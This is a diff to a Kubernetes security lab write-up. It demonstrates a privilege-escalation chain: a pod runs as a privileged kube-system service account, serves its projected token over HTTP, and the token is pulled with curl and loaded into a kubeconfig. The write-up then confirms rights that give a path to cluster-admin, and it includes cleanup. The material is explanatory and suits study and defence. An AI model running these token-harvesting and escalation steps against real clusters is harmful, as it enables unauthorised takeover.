@@ -709,17 +709,17 @@ This matters because most identity pivot techniques require reading secrets or m
 
 ### Manual Validation: SA Spec Identity Pivot
 
-We validate this from the code-server pod. The code-server SA can create pods in the `cicd` namespace and specify `serviceAccountName`. We create a pod that runs as the `default` SA in cicd, reads its own projected token on startup, and serves it over HTTP using `hostNetwork`:
+We validate the exact chain [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) flagged. The `clusterrole-aggregation-controller` SA in `kube-system` has the `escalate` verb on ClusterRoles, which bypasses RBAC escalation prevention. We create a pod in `kube-system` that runs as this SA, reads its projected token, and serves it over HTTP:
 
 ```bash
-[code-server pod] $ /tmp/kubectl --kubeconfig=/tmp/cs-kubeconfig apply -f - <<EOF
+[k8s-control-plane-1] $ kubectl apply -f - <<EOF
 apiVersion: v1
 kind: Pod
 metadata:
   name: sa-spec-test
-  namespace: cicd
+  namespace: kube-system
 spec:
-  serviceAccountName: default
+  serviceAccountName: clusterrole-aggregation-controller
   hostNetwork: true
   containers:
   - name: harvest
@@ -732,40 +732,78 @@ EOF
 pod/sa-spec-test created
 ```
 
-The pod starts on worker-2 with `hostNetwork`, so the HTTP server is reachable at the node IP. We retrieve the token:
+The pod starts on worker-2 with `hostNetwork`, so the HTTP server is reachable at the node IP:
 
 ```bash
-[code-server pod] $ curl -s http://10.3.10.31:9999/tmp/stolen-token.txt -o /tmp/stolen-token.txt
+[k8s-control-plane-1] $ kubectl get pod sa-spec-test -n kube-system -o wide
 ```
 
-Now we build a clean kubeconfig with the stolen token and verify the identity:
+```
+NAME           READY   STATUS    RESTARTS   AGE   IP           NODE           
+sa-spec-test   1/1     Running   0          5s    10.3.10.31   k8s-worker-2
+```
+
+We retrieve the projected token:
 
 ```bash
-[code-server pod] $ /tmp/kubectl config set-cluster lab --server=https://10.3.10.20:6443 --insecure-skip-tls-verify --kubeconfig=/tmp/pivot.yaml
-[code-server pod] $ /tmp/kubectl config set-credentials pivot --token=$(cat /tmp/stolen-token.txt) --kubeconfig=/tmp/pivot.yaml
-[code-server pod] $ /tmp/kubectl config set-context pivot --cluster=lab --user=pivot --kubeconfig=/tmp/pivot.yaml
-[code-server pod] $ /tmp/kubectl config use-context pivot --kubeconfig=/tmp/pivot.yaml
+[k8s-control-plane-1] $ curl -s http://10.3.10.31:9999/stolen-token.txt -o /tmp/stolen-token.txt
+```
+
+Now we build a clean kubeconfig with the stolen token. A clean kubeconfig is important because if your kubeconfig has client certificates, kubectl uses them instead of the `--token` flag:
+
+```bash
+[k8s-control-plane-1] $ kubectl config set-cluster lab --server=https://10.3.10.20:6443 --insecure-skip-tls-verify --kubeconfig=/tmp/pivot.yaml
+[k8s-control-plane-1] $ kubectl config set-credentials pivot --token=$(cat /tmp/stolen-token.txt) --kubeconfig=/tmp/pivot.yaml
+[k8s-control-plane-1] $ kubectl config set-context pivot --cluster=lab --user=pivot --kubeconfig=/tmp/pivot.yaml
+[k8s-control-plane-1] $ kubectl config use-context pivot --kubeconfig=/tmp/pivot.yaml
 ```
 
 ```bash
-[code-server pod] $ /tmp/kubectl --kubeconfig=/tmp/pivot.yaml auth whoami
+[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/pivot.yaml auth whoami
 ```
 
 ```
 ATTRIBUTE   VALUE
-Username    system:serviceaccount:cicd:default
-Groups      [system:serviceaccounts system:serviceaccounts:cicd
+Username    system:serviceaccount:kube-system:clusterrole-aggregation-controller
+UID         79be7a4f-230d-4688-a8ce-409a4950484f
+Groups      [system:serviceaccounts system:serviceaccounts:kube-system
              system:authenticated]
 ```
 
-The token works. We are now authenticated as `system:serviceaccount:cicd:default`. We created a pod, specified the SA, and harvested its projected token. We never read a secret. We never used the TokenRequest API. We just used `create pods`.
+We are now `system:serviceaccount:kube-system:clusterrole-aggregation-controller`. Now verify the dangerous permissions that [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) flagged:
 
-In this lab, the `default` SA in cicd has no dangerous permissions. But in production clusters, teams often bind roles to the `default` SA or create SAs with broad permissions in shared namespaces. If a service account with `get secrets` or `create clusterrolebindings` lives in a namespace where you can create pods, this path gives you that identity in three steps.
+```bash
+[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/pivot.yaml auth can-i escalate clusterroles
+```
+
+```
+yes
+```
+
+```bash
+[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/pivot.yaml auth can-i update clusterroles
+```
+
+```
+yes
+```
+
+```bash
+[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/pivot.yaml auth can-i patch clusterroles
+```
+
+```
+yes
+```
+
+Confirmed. This SA can `escalate`, `update`, and `patch` any ClusterRole. The `escalate` verb bypasses the Kubernetes RBAC escalation prevention check. This means this identity can add wildcard permissions to any ClusterRole, then bind that role to itself. That is a direct path to cluster-admin.
+
+We created a pod, specified the SA, and harvested its projected token. We never read a secret. We never used the TokenRequest API. We just used `create pods`.
 
 ### Cleanup
 
 ```bash
-[code-server pod] $ /tmp/kubectl --kubeconfig=/tmp/cs-kubeconfig delete pod sa-spec-test -n cicd
+[k8s-control-plane-1] $ kubectl delete pod sa-spec-test -n kube-system
 ```
 
 ```
@@ -773,7 +811,7 @@ pod "sa-spec-test" deleted
 ```
 
 ```bash
-[code-server pod] $ rm -f /tmp/stolen-token.txt /tmp/pivot.yaml
+[k8s-control-plane-1] $ rm -f /tmp/stolen-token.txt /tmp/pivot.yaml
 ```
 
 ---
